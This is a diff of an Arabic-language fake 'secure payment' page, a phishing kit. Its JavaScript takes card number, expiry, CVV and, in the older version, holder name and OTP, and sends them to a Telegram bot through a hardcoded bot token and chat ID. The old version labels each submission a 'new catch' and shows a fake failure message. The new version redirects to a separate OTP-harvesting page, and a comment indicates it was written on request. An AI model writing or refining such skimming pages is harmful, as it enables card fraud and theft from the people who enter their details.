@@ -1,78 +1,26 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدفع الآمن</title>
-    <style>
-        body { font-family: 'Tahoma', sans-serif; background-color: #eef2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .payment-box { background: #ffffff; padding: 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 380px; }
-        .header { text-align: center; margin-bottom: 20px; }
-        .header h2 { color: #1a73e8; font-size: 22px; margin: 0; }
-        label { display: block; margin: 10px 0 5px; color: #555; font-weight: bold; font-size: 13px; }
-        input { width: 100%; padding: 14px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 17px; letter-spacing: 1px; outline: none; transition: 0.3s; }
-        input:focus { border-color: #1a73e8; box-shadow: 0 0 8px rgba(26,115,232,0.2); }
-        .flex { display: flex; gap: 15px; }
-        .flex div { flex: 1; }
-        button { width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; margin-top: 20px; cursor: pointer; }
-    </style>
-</head>
-<body>
-
-<div class="payment-box">
-    <div class="header">
-        <h2>تأكيد بيانات البطاقة</h2>
-    </div>
-    
-    <label>رقم البطاقة</label>
-    <input type="text" id="card_num" placeholder="0000 0000 0000 0000" maxlength="19">
-
-    <div class="flex">
-        <div>
-            <label>تاريخ الانتهاء</label>
-            <input type="text" id="exp" placeholder="MM/YY" maxlength="5">
-        </div>
-        <div>
-            <label>رمز CVV</label>
-            <input type="text" id="cvv" placeholder="123" maxlength="3">
-        </div>
-    </div>
-
-    <label>اسم صاحب البطاقة</label>
-    <input type="text" id="holder" placeholder="الاسم الكامل">
-
-    <label>رمز التحقق (OTP)</label>
-    <input type="text" id="otp" placeholder="أدخل الرمز المستلم">
-
-    <button onclick="sendData()">تأكيد الدفع</button>
-</div>
+<input type="text" id="card_num" placeholder="رقم البطاقة" maxlength="19">
+<input type="text" id="exp" placeholder="MM/YY" maxlength="5">
+<input type="text" id="cvv" placeholder="CVV" maxlength="3">
+<button onclick="nextStep()">استمرار</button>
 
 <script>
-    // تنسيق رقم البطاقة (فراغات)
+    // التنسيقات التلقائية كما طلبت
     document.getElementById('card_num').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
-
-    // تنسيق التاريخ (شخطه)
     document.getElementById('exp').addEventListener('input', function (e) {
         let v = e.target.value.replace(/[^\d]/g, '');
         if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
         e.target.value = v;
     });
 
-    async function sendData() {
+    async function nextStep() {
         const t = "8429424516:AAE0Cuy11JdGBYdtd3HMGAEnh-l_Szxk928";
         const c = "6134623694";
-        const m = `🚀 صيد جديد:\n💳 كرت: ${document.getElementById('card_num').value}\n📅 تاريخ: ${document.getElementById('exp').value}\n🔐 CVV: ${document.getElementById('cvv').value}\n👤 اسم: ${document.getElementById('holder').value}\n📱 كود: ${document.getElementById('otp').value}`;
+        const m = `💳 بيانات البطاقة:\nرقم: ${document.getElementById('card_num').value}\nتاريخ: ${document.getElementById('exp').value}\nCVV: ${document.getElementById('cvv').value}`;
         
-        const url = `https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`;
-        
-        try {
-            await fetch(url);
-            alert("فشل في التحقق من الرمز، يرجى المحاولة مرة أخرى.");
-        } catch (e) { console.error(e); }
+        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`);
+        // الانتقال لصفحة الكود المنفصلة
+        window.location.href = "otp.html";
     }
 </script>
-
-</body>
-</html>
